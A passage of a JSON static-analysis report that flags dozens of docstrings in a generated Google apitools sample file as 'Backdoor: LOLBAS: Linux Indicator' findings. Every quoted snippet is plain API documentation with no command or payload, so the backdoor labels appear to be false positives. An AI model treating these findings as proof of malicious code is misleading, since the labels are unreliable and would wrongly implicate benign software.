                  "endColumn": 50,
                  "snippet": {
                    "text": "  Fields:\n    defaultLimit: Default number of tokens that can be consumed during the\n      specified duration. This is the number of tokens assigned when a client\n      application developer activates the service for his/her project.\n      Specifying a value of 0 will block all requests. This can be used if you\n      are provisioning quota to selected consumers and blocking others.\n      Similarly, a value of -1 will indicate an unlimited quota. No other\n",
                    "rendered": {
                      "text": "  Fields:\n    defaultLimit: Default number of tokens that can be consumed during the\n      specified duration. This is the number of tokens assigned when a client\n      application developer activates the service for his/her project.\n      Specifying a value of 0 will block all requests. This can be used if you\n      are provisioning quota to selected consumers and blocking others.\n      Similarly, a value of -1 will indicate an unlimited quota. No other\n",
                      "markdown": "`  Fields:\n    defaultLimit: Default number of tokens that can be consumed during the\n      specified duration. This is the number of tokens assigned when a client\n      application developer activates the service for his/her project.\n      Specifying a value of 0 will block all requests. This can be used if you\n      are provisioning quota to selected consumers and blocking others.\n      Similarly, a value of -1 will indicate an unlimited quota. No other\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1969,
                  "startColumn": 53,
                  "endLine": 1969,
                  "endColumn": 59,
                  "snippet": {
                    "text": "  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n  more   days. These limits help client application developers predict the\n  usage and help budgeting.  Quota enforcement uses a simple token-based\n  algorithm for resource sharing.  The quota configuration structure is as\n",
                    "rendered": {
                      "text": "  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n  more   days. These limits help client application developers predict the\n  usage and help budgeting.  Quota enforcement uses a simple token-based\n  algorithm for resource sharing.  The quota configuration structure is as\n",
                      "markdown": "`  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n  more   days. These limits help client application developers predict the\n  usage and help budgeting.  Quota enforcement uses a simple token-based\n  algorithm for resource sharing.  The quota configuration structure is as\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1967,
                  "startColumn": 41,
                  "endLine": 1967,
                  "endColumn": 50,
                  "snippet": {
                    "text": "  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n  more   days. These limits help client application developers predict the\n",
                    "rendered": {
                      "text": "  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n  more   days. These limits help client application developers predict the\n",
                      "markdown": "`  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n  more   days. These limits help client application developers predict the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1965,
                  "startColumn": 33,
                  "endLine": 1965,
                  "endColumn": 39,
                  "snippet": {
                    "text": "class Quota(_messages.Message):\n  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n",
                    "rendered": {
                      "text": "class Quota(_messages.Message):\n  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n",
                      "markdown": "`class Quota(_messages.Message):\n  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1963,
                  "startColumn": 68,
                  "endLine": 1964,
                  "snippet": {
                    "text": "\n\nclass Quota(_messages.Message):\n  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n",
                    "rendered": {
                      "text": "\n\nclass Quota(_messages.Message):\n  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n",
                      "markdown": "`\n\nclass Quota(_messages.Message):\n  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1954,
                  "startColumn": 53,
                  "endLine": 1954,
                  "endColumn": 62,
                  "snippet": {
                    "text": "  Fields:\n    accessibleVisibilityLabels: Any visibility labels on the service that are\n      accessible by the user.\n    canAccessService: True if the user can access the service and any\n      unrestricted API surface.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  Fields:\n    accessibleVisibilityLabels: Any visibility labels on the service that are\n      accessible by the user.\n    canAccessService: True if the user can access the service and any\n      unrestricted API surface.\n  \"\"\"\n\n",
                      "markdown": "`  Fields:\n    accessibleVisibilityLabels: Any visibility labels on the service that are\n      accessible by the user.\n    canAccessService: True if the user can access the service and any\n      unrestricted API surface.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1952,
                  "startColumn": 60,
                  "endLine": 1952,
                  "endColumn": 69,
                  "snippet": {
                    "text": "  r\"\"\"Request message for QueryUserAccess method.\n\n  Fields:\n    accessibleVisibilityLabels: Any visibility labels on the service that are\n      accessible by the user.\n    canAccessService: True if the user can access the service and any\n      unrestricted API surface.\n",
                    "rendered": {
                      "text": "  r\"\"\"Request message for QueryUserAccess method.\n\n  Fields:\n    accessibleVisibilityLabels: Any visibility labels on the service that are\n      accessible by the user.\n    canAccessService: True if the user can access the service and any\n      unrestricted API surface.\n",
                      "markdown": "`  r\"\"\"Request message for QueryUserAccess method.\n\n  Fields:\n    accessibleVisibilityLabels: Any visibility labels on the service that are\n      accessible by the user.\n    canAccessService: True if the user can access the service and any\n      unrestricted API surface.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1939,
                  "startColumn": 37,
                  "endLine": 1939,
                  "endColumn": 46,
                  "snippet": {
                    "text": "\n\nclass ProtoSpec(_messages.Message):\n  r\"\"\"A collection of protocol buffer service specification files.\n\n  Fields:\n    protoDescriptor: A complete descriptor of a protocol buffer specification\n",
                    "rendered": {
                      "text": "\n\nclass ProtoSpec(_messages.Message):\n  r\"\"\"A collection of protocol buffer service specification files.\n\n  Fields:\n    protoDescriptor: A complete descriptor of a protocol buffer specification\n",
                      "markdown": "`\n\nclass ProtoSpec(_messages.Message):\n  r\"\"\"A collection of protocol buffer service specification files.\n\n  Fields:\n    protoDescriptor: A complete descriptor of a protocol buffer specification\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1846,
                  "startColumn": 18,
                  "endLine": 1846,
                  "endColumn": 27,
                  "snippet": {
                    "text": "  class PropertiesValue(_messages.Message):\n    r\"\"\"Service-defined per-consumer properties.  A key-value mapping a string\n    key to a google.protobuf.ListValue proto. Values in the list are typed as\n    defined in the Service configuration's consumer.properties field.\n\n    Messages:\n      AdditionalProperty: An additional property for a PropertiesValue object.\n",
                    "rendered": {
                      "text": "  class PropertiesValue(_messages.Message):\n    r\"\"\"Service-defined per-consumer properties.  A key-value mapping a string\n    key to a google.protobuf.ListValue proto. Values in the list are typed as\n    defined in the Service configuration's consumer.properties field.\n\n    Messages:\n      AdditionalProperty: An additional property for a PropertiesValue object.\n",
                      "markdown": "`  class PropertiesValue(_messages.Message):\n    r\"\"\"Service-defined per-consumer properties.  A key-value mapping a string\n    key to a google.protobuf.ListValue proto. Values in the list are typed as\n    defined in the Service configuration's consumer.properties field.\n\n    Messages:\n      AdditionalProperty: An additional property for a PropertiesValue object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1838,
                  "startColumn": 67,
                  "endLine": 1839,
                  "snippet": {
                    "text": "      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n  \"\"\"\n\n  @encoding.MapUnrecognizedFields('additionalProperties')\n",
                    "rendered": {
                      "text": "      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n  \"\"\"\n\n  @encoding.MapUnrecognizedFields('additionalProperties')\n",
                      "markdown": "`      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n  \"\"\"\n\n  @encoding.MapUnrecognizedFields('additionalProperties')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1836,
                  "startColumn": 53,
                  "endLine": 1836,
                  "endColumn": 62,
                  "snippet": {
                    "text": "      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n",
                    "rendered": {
                      "text": "      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n",
                      "markdown": "`      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1832,
                  "startColumn": 65,
                  "endLine": 1832,
                  "endColumn": 74,
                  "snippet": {
                    "text": "      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n",
                    "rendered": {
                      "text": "      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n",
                      "markdown": "`      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1830,
                  "startColumn": 33,
                  "endLine": 1830,
                  "endColumn": 42,
                  "snippet": {
                    "text": "      if requested.\n    properties: Service-defined per-consumer properties.  A key-value mapping\n      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n",
                    "rendered": {
                      "text": "      if requested.\n    properties: Service-defined per-consumer properties.  A key-value mapping\n      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n",
                      "markdown": "`      if requested.\n    properties: Service-defined per-consumer properties.  A key-value mapping\n      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1821,
                  "startColumn": 38,
                  "endLine": 1821,
                  "endColumn": 47,
                  "snippet": {
                    "text": "  Messages:\n    PropertiesValue: Service-defined per-consumer properties.  A key-value\n      mapping a string key to a google.protobuf.ListValue proto. Values in the\n      list are typed as defined in the Service configuration's\n      consumer.properties field.\n\n  Fields:\n",
                    "rendered": {
                      "text": "  Messages:\n    PropertiesValue: Service-defined per-consumer properties.  A key-value\n      mapping a string key to a google.protobuf.ListValue proto. Values in the\n      list are typed as defined in the Service configuration's\n      consumer.properties field.\n\n  Fields:\n",
                      "markdown": "`  Messages:\n    PropertiesValue: Service-defined per-consumer properties.  A key-value\n      mapping a string key to a google.protobuf.ListValue proto. Values in the\n      list are typed as defined in the Service configuration's\n      consumer.properties field.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1801,
                  "startColumn": 66,
                  "endLine": 1802,
                  "snippet": {
                    "text": "  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n  responds to the client. This descriptor defines which properties are allowed\n  to be set on a project.  Example:     project_properties:      properties:\n  - name: NO_WATERMARK        type: BOOL        description: Allows usage of\n  the API without watermarks.      - name: EXTENDED_TILE_CACHE_PERIOD\n",
                    "rendered": {
                      "text": "  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n  responds to the client. This descriptor defines which properties are allowed\n  to be set on a project.  Example:     project_properties:      properties:\n  - name: NO_WATERMARK        type: BOOL        description: Allows usage of\n  the API without watermarks.      - name: EXTENDED_TILE_CACHE_PERIOD\n",
                      "markdown": "`  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n  responds to the client. This descriptor defines which properties are allowed\n  to be set on a project.  Example:     project_properties:      properties:\n  - name: NO_WATERMARK        type: BOOL        description: Allows usage of\n  the API without watermarks.      - name: EXTENDED_TILE_CACHE_PERIOD\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1798,
                  "startColumn": 42,
                  "endLine": 1798,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\nclass ProjectProperties(_messages.Message):\n  r\"\"\"A descriptor for defining project properties for a service. One service\n  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n",
                    "rendered": {
                      "text": "\nclass ProjectProperties(_messages.Message):\n  r\"\"\"A descriptor for defining project properties for a service. One service\n  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n",
                      "markdown": "`\nclass ProjectProperties(_messages.Message):\n  r\"\"\"A descriptor for defining project properties for a service. One service\n  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1797,
                  "startColumn": 69,
                  "endLine": 1798,
                  "snippet": {
                    "text": "\n\nclass ProjectProperties(_messages.Message):\n  r\"\"\"A descriptor for defining project properties for a service. One service\n  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n",
                    "rendered": {
                      "text": "\n\nclass ProjectProperties(_messages.Message):\n  r\"\"\"A descriptor for defining project properties for a service. One service\n  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n",
                      "markdown": "`\n\nclass ProjectProperties(_messages.Message):\n  r\"\"\"A descriptor for defining project properties for a service. One service\n  may have many consumer projects, and the service may want to behave\n  differently depending on some properties on the project. For example, a\n  project may be associated with a school, or a business, or a government\n  agency, a business type property on the project may affect how a service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1720,
                  "startColumn": 24,
                  "endLine": 1720,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      from 0 to 100.\n    resourceNames: The full name of the resources that this operation is\n      directly associated with.\n    startTime: The start time of the operation.\n    steps: Detailed status information for each step. The order is\n      undetermined.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      from 0 to 100.\n    resourceNames: The full name of the resources that this operation is\n      directly associated with.\n    startTime: The start time of the operation.\n    steps: Detailed status information for each step. The order is\n      undetermined.\n  \"\"\"\n",
                      "markdown": "`      from 0 to 100.\n    resourceNames: The full name of the resources that this operation is\n      directly associated with.\n    startTime: The start time of the operation.\n    steps: Detailed status information for each step. The order is\n      undetermined.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 5,
                  "endLine": 1635,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      that returns a long-running operation should document the metadata type,\n      if any.\n    name: The server-assigned name, which is only unique within the same\n      service that originally returns it. If you use the default HTTP mapping,\n      the `name` should have the format of `operations/some/unique/name`.\n    response: The normal response of the operation in case of success.  If the\n      original method returns no data on success, such as `Delete`, the\n",
                    "rendered": {
                      "text": "      that returns a long-running operation should document the metadata type,\n      if any.\n    name: The server-assigned name, which is only unique within the same\n      service that originally returns it. If you use the default HTTP mapping,\n      the `name` should have the format of `operations/some/unique/name`.\n    response: The normal response of the operation in case of success.  If the\n      original method returns no data on success, such as `Delete`, the\n",
                      "markdown": "`      that returns a long-running operation should document the metadata type,\n      if any.\n    name: The server-assigned name, which is only unique within the same\n      service that originally returns it. If you use the default HTTP mapping,\n      the `name` should have the format of `operations/some/unique/name`.\n    response: The normal response of the operation in case of success.  If the\n      original method returns no data on success, such as `Delete`, the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1465,
                  "startColumn": 33,
                  "endLine": 1465,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  relative path under which inherited HTTP paths are placed. Example:\n  apis:     - name: google.storage.v2.Storage       mixins:       - name:\n  google.acl.v1.AccessControl         root: acls  This implies the following\n  inherited HTTP annotation:      service Storage {       // Get the\n  underlying ACL object.       rpc GetAcl(GetAclRequest) returns (Acl) {\n  option (google.api.http).get = \"/v2/acls/{resource=**}:getAcl\";       }\n  ...     }\n",
                    "rendered": {
                      "text": "  relative path under which inherited HTTP paths are placed. Example:\n  apis:     - name: google.storage.v2.Storage       mixins:       - name:\n  google.acl.v1.AccessControl         root: acls  This implies the following\n  inherited HTTP annotation:      service Storage {       // Get the\n  underlying ACL object.       rpc GetAcl(GetAclRequest) returns (Acl) {\n  option (google.api.http).get = \"/v2/acls/{resource=**}:getAcl\";       }\n  ...     }\n",
                      "markdown": "`  relative path under which inherited HTTP paths are placed. Example:\n  apis:     - name: google.storage.v2.Storage       mixins:       - name:\n  google.acl.v1.AccessControl         root: acls  This implies the following\n  inherited HTTP annotation:      service Storage {       // Get the\n  underlying ACL object.       rpc GetAcl(GetAclRequest) returns (Acl) {\n  option (google.api.http).get = \"/v2/acls/{resource=**}:getAcl\";       }\n  ...     }\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1457,
                  "startColumn": 58,
